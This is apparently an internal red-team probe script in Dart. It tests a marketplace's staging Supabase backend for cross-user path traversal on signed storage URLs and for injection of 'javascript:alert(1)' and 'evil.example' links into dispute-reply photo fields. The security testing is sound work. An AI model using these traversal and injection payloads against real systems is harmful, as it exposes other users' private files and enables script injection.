// ignore_for_file: avoid_print
/// Pass 3 — disputa reason válido; path traversal CROSS-USER
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import '../live_ops_staging_client.dart';

const prefix = 'RTZ-20260901T1715-';
const probeFile = 'tool/redteam_blind_z_20260901T1715/probe_result.json';

Future<Map<String, dynamic>> req(
  String method,
  String u,
  Map<String, String> h, [
  Object? body,
]) async {
  final r = method == 'POST'
      ? await http.post(Uri.parse(u), headers: h, body: body == null ? null : jsonEncode(body))
      : method == 'PATCH'
          ? await http.patch(Uri.parse(u), headers: h, body: body == null ? null : jsonEncode(body))
          : await http.get(Uri.parse(u), headers: h);
  dynamic p;
  try {
    p = r.body.isEmpty ? null : jsonDecode(r.body);
  } catch (_) {
    p = r.body;
  }
  return {'http': r.statusCode, 'body': p, 'raw': r.body};
}

String? idOf(dynamic body) {
  if (body is List && body.isNotEmpty && body.first is Map) {
    final s = '${(body.first as Map)['id'] ?? ''}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  if (body is Map && body['id'] != null) {
    final s = '${body['id']}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  return null;
}

Map<String, dynamic>? firstMap(dynamic body) {
  if (body is List && body.isNotEmpty && body.first is Map) {
    return Map<String, dynamic>.from(body.first as Map);
  }
  if (body is Map) return Map<String, dynamic>.from(body);
  return null;
}

Future<void> main() async {
  final prior = jsonDecode(File(probeFile).readAsStringSync()) as Map;
  final e = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(e, 'SUPABASE_URL'));
  final anon = envRequire(e, 'SUPABASE_ANON_KEY');
  final svc = envRequire(e, 'SUPABASE_SERVICE_ROLE_KEY');
  final sb = LiveOpsStagingClient(url: url, anonKey: anon, serviceRoleKey: svc);
  final buyerTok = await sb.signIn(
    email: envRequire(e, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(e, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  Map<String, String> h(String tok) => {
        'apikey': anon,
        'Authorization': 'Bearer $tok',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };
  final BH = h(buyerTok);
  final SVC = {
    'apikey': svc,
    'Authorization': 'Bearer $svc',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final oid = prior['order_id'] as String;
  final buyerId = prior['buyer'] as String;
  final extra = <Map<String, dynamic>>[];
  final closed = <Map<String, dynamic>>[];
  void f(String id, String sev, String title, Object obtained) {
    extra.add({'id': id, 'sev': sev, 'title': title, 'obtained': obtained});
    print('FINDING $sev $id · $title');
  }

  void c(String id, String msg) {
    closed.add({'id': id, 'msg': msg});
    print('CLOSED $id · $msg');
  }

  // other buyer orders
  final others = await req(
    'GET',
    '$url/rest/v1/orders?select=id,buyer_id,status,proof_url&buyer_id=neq.$buyerId&proof_url=not.is.null&limit=5',
    SVC,
  );
  print('OTHER ORDERS ${others['raw'].toString().substring(0, (others['raw'] as String).length.clamp(0, 600))}');

  final other = firstMap(others['body']);
  final otherBuyer = other?['buyer_id']?.toString();
  final otherOid = other?['id']?.toString();
  final otherProof = other?['proof_url']?.toString() ?? '';
  print('other buyer=$otherBuyer order=$otherOid proof=$otherProof');

  // list storage objects under another buyer if we can via service
  final list = await req(
    'POST',
    '$url/storage/v1/object/list/fleaber_private',
    SVC,
    {
      'prefix': otherBuyer == null ? 'order_proofs/' : 'order_proofs/$otherBuyer',
      'limit': 3,
    },
  );
  print('LIST OTHER ${list['http']} ${list['raw'].toString().substring(0, (list['raw'] as String).length.clamp(0, 500))}');

  String? victimPath;
  if (list['body'] is List && (list['body'] as List).isNotEmpty) {
    final name = (list['body'] as List).first;
    if (name is Map) {
      victimPath = 'order_proofs/$otherBuyer/${name['name']}';
      // list with prefix already includes... check name field
      print('obj keys=${name.keys.toList()} name=${name['name']}');
      final n = '${name['name']}';
      victimPath = n.contains('order_proofs/')
          ? n
          : 'order_proofs/$otherBuyer/$n';
    }
  }

  if (victimPath != null) {
    final direct = await req(
      'POST',
      '$url/storage/v1/object/sign/fleaber_private/$victimPath',
      BH,
      {'expiresIn': 60},
    );
    print('DIRECT VICTIM ${direct['http']} ${direct['raw']}');
    final trav =
        'chat_uploads/../$victimPath';
    final travR = await req(
      'POST',
      '$url/storage/v1/object/sign/fleaber_private/$trav',
      BH,
      {'expiresIn': 60},
    );
    print('TRAV VICTIM ${travR['http']} ${travR['raw']}');
    if ((direct['http'] as int) >= 400 && (travR['http'] as int) < 300) {
      f(
        'Z4-TRAV-CROSS-USER-PROOF',
        'P1',
        'Path traversal signed URL de prova de outro comprador (direct sign falha, trav succede)',
        {'direct': direct['http'], 'trav': travR['body'], 'path': victimPath},
      );
    } else if ((travR['http'] as int) < 300) {
      f(
        'Z4-TRAV-CROSS-USER-PROOF',
        'P1',
        'Signed URL via .. para path de outro comprador',
        {'trav': travR['body'], 'direct': direct['http']},
      );
    } else {
      c('Z4.trav_cross', 'direct=${direct['http']} trav=${travR['http']} ${travR['raw']}');
    }
  } else {
    c('Z4.trav_cross', 'no victim object listed');
  }

  // dispute with valid reason
  final disp = await req('POST', '$url/rest/v1/order_disputes', SVC, {
    'order_id': oid,
    'buyer_id': buyerId,
    'reason': 'em_falta',
    'status': 'aberta',
    'current_turn': 'vendedor',
  });
  print('DISP ${disp['http']} ${disp['raw']}');
  final did = idOf(disp['body']);
  if (did != null) {
    final reply = await req('POST', '$url/rest/v1/order_dispute_replies', BH, {
      'dispute_id': did,
      'sender_id': buyerId,
      'message': '${prefix}p3',
      'proof_photos': [
        'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/ok'
      ],
    });
    print('REPLY ${reply['http']} ${reply['raw']}');
    final rid = idOf(reply['body']);
    if (rid != null) {
      final patch = await req(
        'PATCH',
        '$url/rest/v1/order_dispute_replies?id=eq.$rid',
        BH,
        {
          'proof_photos': ['javascript:alert(1)', 'https://evil.example/x.png'],
        },
      );
      final row = firstMap((await req(
        'GET',
        '$url/rest/v1/order_dispute_replies?id=eq.$rid&select=id,proof_photos',
        SVC,
      ))['body']);
      print('PATCH ${patch['http']} $row ${patch['raw']}');
      final photos = '${row?['proof_photos']}';
      if ((patch['http'] as int) < 300 &&
          (photos.contains('javascript') || photos.contains('evil'))) {
        f(
          'Z4-DISPUTE-REPLY-UPDATE-PHOTOS',
          'P1',
          'PATCH replies.proof_photos javascript/externo (INSERT-only trigger)',
          row ?? {},
        );
      } else {
        c('Z4.reply_patch', '${patch['http']} $photos ${patch['raw']}');
      }
    } else {
      c('Z4.reply_ins', '${reply['http']} ${reply['raw']}');
    }
  } else {
    c('Z4.disp_ins', '${disp['http']} ${disp['raw']}');
  }

  File('tool/redteam_blind_z_20260901T1715/pass3_result.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert({'extra': extra, 'closed': closed}),
  );
}
